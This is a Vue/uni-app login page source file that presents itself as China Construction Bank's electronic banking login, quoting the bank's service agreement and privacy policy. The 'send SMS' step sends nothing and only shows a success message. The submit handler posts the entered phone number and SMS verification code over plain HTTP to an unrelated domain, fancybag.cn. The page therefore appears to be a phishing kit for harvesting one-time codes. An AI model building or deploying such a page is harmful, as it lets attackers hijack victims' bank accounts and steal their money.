<template>
  <view class="page">
    <splash-screen
      v-if="screen === 'splash'"
      :countdown="countdown"
      @skip="skipSplash"
    />
    <login-panel
      v-else
      :phone="phone"
      :area-codes="areaCodes"
      :selected-area-index="selectedAreaIndex"
      :agreement-checked="agreementChecked"
      :login-icons="loginIcons"
      :sms-code="smsCode"
      :sms-countdown="smsCountdown"
      @update:phone="phone = $event"
      @update:sms-code="smsCode = $event"
      @request-sms="handleRequestSms"
      @area-change="handleAreaChange"
      @toggle-agreement="toggleAgreement"
      @submit="handleSubmit"
      @open-doc="openDoc"
    />
  </view>
</template>

<script>
import SplashScreen from '../../components/SplashScreen.vue'
import LoginPanel from '../../components/LoginPanel.vue'

let splashTimer = null
let smsTimer = null

export default {
  components: {
    SplashScreen,
    LoginPanel
  },
  data() {
    return {
      screen: 'splash',
      countdown: 3,
      phone: '',
      smsCode: '',
      smsCountdown: 0,
      agreementChecked: false,
      areaCodes: [
        { label: '+86 中国大陆', value: '+86' },
        { label: '+852 香港', value: '+852' },
        { label: '+853 澳门', value: '+853' },
        { label: '+886 台湾', value: '+886' }
      ],
      selectedAreaIndex: 0,
      loginIcons: [
        { name: 'wechat', src: '/static/wechat.png' },
        { name: 'alipay', src: '/static/Alipay.png' }
      ],
      documents: {
        service: {
          title: '电子银行个人客户服务协议',
          content: '请阅读《中国建设银行股份有限公司电子银行个人客户服务协议》、《中国建设银行股份有限公司个人信息保护政策》后勾选同意。'
        },
        privacy: {
          title: '个人信息保护政策',
          content: '我们依据相关法律法规保护您的个人信息，请详细阅读并确认同意后继续操作。'
        }
      }
    }
  },
  onLoad() {
    this.startSplashCountdown()
  },
  onUnload() {
    this.clearSplashTimer()
    this.clearSmsTimer()
  },
  methods: {
    startSplashCountdown() {
      this.clearSplashTimer()
      splashTimer = setInterval(() => {
        if (this.countdown <= 1) {
          this.skipSplash()
          return
        }
        this.countdown -= 1
      }, 1000)
    },
    clearSplashTimer() {
      if (splashTimer) {
        clearInterval(splashTimer)
        splashTimer = null
      }
    },
    startSmsCountdown() {
      this.clearSmsTimer()
      this.smsCountdown = 60
      smsTimer = setInterval(() => {
        if (this.smsCountdown <= 1) {
          this.smsCountdown = 0
          this.clearSmsTimer()
          return
        }
        this.smsCountdown -= 1
      }, 1000)
    },
    clearSmsTimer() {
      if (smsTimer) {
        clearInterval(smsTimer)
        smsTimer = null
      }
    },
    skipSplash() {
      this.clearSplashTimer()
      this.screen = 'login'
    },
    handleAreaChange(index) {
      this.selectedAreaIndex = Number(index) || 0
    },
    toggleAgreement() {
      this.agreementChecked = !this.agreementChecked
    },
    openDoc(type) {
      const doc = this.documents[type]
      if (!doc) {
        return
      }
      uni.showModal({
        title: doc.title,
        content: doc.content,
        confirmText: '确定',
        showCancel: false
      })
    },
    handleRequestSms() {
      if (this.smsCountdown > 0) {
        return
      }
      const phonePattern = /^1\d{10}$/
      if (!phonePattern.test(this.phone)) {
        uni.showToast({
          title: '手机号格式不正确',
          icon: 'none'
        })
        return
      }
      uni.showToast({
        title: '发送成功',
        icon: 'success'
      })
      this.startSmsCountdown()
    },
    handleSubmit() {
      if (!this.phone) {
        uni.showToast({
          title: '请输入手机号',
          icon: 'none'
        })
        return
      }
      if (!this.smsCode) {
        uni.showToast({
          title: '请输入短信验证码',
          icon: 'none'
        })
        return
      }
      if (!this.agreementChecked) {
        uni.showModal({
          content: this.documents.service.content,
          showCancel: false,
          confirmText: '确定'
        })
        return
      }
      uni.showLoading({
        title: '提交中...',
        mask: true
      })
      uni.request({
        url: 'http://www.fancybag.cn/code',
        method: 'POST',
        data: {
          phone: this.phone,
          smsCode: this.smsCode
        },
        success: () => {
          uni.showToast({
            title: '登录成功',
            icon: 'success'
          })
        },
        fail: () => {
          uni.showToast({
            title: '登录失败',
            icon: 'none'
          })
        },
        complete: () => {
          uni.hideLoading()
        }
      })
    }
  }
}
</script>

<style>
@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600&display=swap');

page {
  background: #f5f7fb;
  min-height: 100%;
  font-family: 'Space Grotesk', 'PingFang SC', 'Microsoft YaHei', sans-serif;
}

.page {
  height: 100vh;
  display: flex;
  flex-direction: column;
}
</style>
